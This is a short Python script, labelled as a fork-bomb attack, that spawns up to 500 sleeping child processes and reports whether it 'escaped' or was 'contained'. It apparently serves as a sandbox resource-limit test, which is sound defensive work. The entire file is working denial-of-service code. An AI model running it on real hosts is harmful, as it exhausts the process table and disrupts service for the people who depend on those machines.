# Attack: fork bomb (exhaust host process table).
import os, time
n = 0
try:
    while n < 500:
        if os.fork() == 0:
            time.sleep(30)
            os._exit(0)
        n += 1
    print("ESCAPED: created", n, "processes")
except OSError as e:
    print("contained after", n, "forks:", type(e).__name__)
